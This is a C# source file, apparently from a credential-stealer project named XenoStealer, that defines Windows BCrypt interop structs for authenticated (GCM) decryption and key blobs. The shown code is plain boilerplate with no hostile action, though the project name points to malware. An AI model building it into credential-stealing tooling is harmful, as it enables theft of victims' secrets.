using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealer
{
    public static class BCryptInternalStructs//this stuff I'm not 100% where i got it, def from some github repo, I didnt want to remake this, as its more tedious than learning.
    {
        private static uint BCRYPT_INIT_AUTH_MODE_INFO_VERSION = 1;

        [StructLayout(LayoutKind.Sequential)]
        public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO : IDisposable
        {
            public uint cbSize;
            public uint dwInfoVersion;
            public IntPtr pbNonce;
            public uint cbNonce;
            public IntPtr pbAuthData;
            public uint cbAuthData;
            public IntPtr pbTag;
            public uint cbTag;
            public IntPtr pbMacContext;
            public uint cbMacContext;
            public uint cbAAD;
            public ulong cbData;
            public uint dwFlags;

            public BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(byte[] iv, byte[] aad, byte[] tag) : this()
            {
                dwInfoVersion = BCRYPT_INIT_AUTH_MODE_INFO_VERSION;
                cbSize = (uint)Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));

                if (iv != null)
                {
                    cbNonce = (uint)iv.Length;
                    pbNonce = Marshal.AllocHGlobal((int)cbNonce);
                    Marshal.Copy(iv, 0, pbNonce, (int)cbNonce);
                }

                if (aad != null)
                {
                    cbAuthData = (uint)aad.Length;
                    pbAuthData = Marshal.AllocHGlobal((int)cbAuthData);
                    Marshal.Copy(aad, 0, pbAuthData, (int)cbAuthData);
                }

                if (tag != null)
                {
                    cbTag = (uint)tag.Length;
                    pbTag = Marshal.AllocHGlobal((int)cbTag);
                    Marshal.Copy(tag, 0, pbTag, (int)cbTag);

                    cbMacContext = (uint)tag.Length;
                    pbMacContext = Marshal.AllocHGlobal((int)cbMacContext);
                }
            }

            public void Dispose()
            {
                if (pbNonce != IntPtr.Zero) Marshal.FreeHGlobal(pbNonce);
                if (pbTag != IntPtr.Zero) Marshal.FreeHGlobal(pbTag);
                if (pbAuthData != IntPtr.Zero) Marshal.FreeHGlobal(pbAuthData);
                if (pbMacContext != IntPtr.Zero) Marshal.FreeHGlobal(pbMacContext);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct BCRYPT_KEY_LENGTHS_STRUCT
        {
            public uint dwMinLength;
            public uint dwMaxLength;
            public uint dwIncrement;
        }
        
        [StructLayout(LayoutKind.Sequential)]
        public struct BCRYPT_KEY_DATA_BLOB_HEADER 
        {
            public uint dwMagic;
            public uint dwVersion;
            public uint cbKeyData;
        }

    }
}
